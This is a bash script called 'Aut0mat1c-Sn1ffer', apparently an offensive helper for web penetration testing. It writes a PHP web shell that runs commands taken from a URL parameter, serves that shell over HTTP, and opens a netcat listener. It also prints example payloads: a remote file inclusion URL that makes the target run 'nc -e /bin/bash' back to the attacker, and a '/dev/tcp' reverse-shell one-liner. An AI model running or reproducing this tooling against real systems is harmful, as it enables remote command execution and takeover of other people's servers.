#!/bin/bash
sudo apt update
sudo apt install xterm
sudo apt install python3
cd ..;cd ..;cd ..;cd ..;
cd X || mkdir X && cd X
clear
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

cleanup() {
    pkill -P $$
    exit
}
trap cleanup SIGINT

clear
echo -e "${RED}--| Created By UMIT SAMET TASCI |--"
echo -e "-------| Aut0mat1c-Sn1ffer |-------${NC}"
sleep 1

cat <<EOF > kabuk.txt
<?php
if(isset(\$_GET['cmd'])) {
    echo "<pre>";
    system(\$_GET['cmd']);
    echo "</pre>";
} else {
    echo "Aut0mat1c-Sn1ffer is active. (Usage: ?cmd=[command])";
}
?>
EOF

MY_IP=$(hostname -I | awk '{print $1}')
HTTP_PORT=80
NC_PORT=4444

check_port() {
    if lsof -Pi :$1 -sTCP:LISTEN -t >/dev/null ; then
        echo -e "${RED}[!] Port $1 busy!${NC}"
        exit 1
    fi
}
check_port $HTTP_PORT
check_port $NC_PORT

xterm -T "Payload Server" -geometry 80x30+0+0 -hold -e "python3 -m http.server $HTTP_PORT" &

xterm -T "NC Listener" -geometry 80x30+80+0 -hold -e \
"echo -e '${GREEN}Listening...${NC}'; 
 echo '--------------------------------------------------';
 echo 'Example: http://ninja.testlab.local/index.php?page=http://192.168.111.100/kabuk.txt?&cmd=nc -e /bin/bash 192.168.111.100 4444%00';
 echo 'REV: bash -i >& /dev/tcp/$MY_IP/$NC_PORT 0>&1';
 echo '--------------------------------------------------';
 nc -lvp $NC_PORT" &

echo -e "${GREEN}[✔] Ready. Press CTRL+C to stop.${NC}"
wait
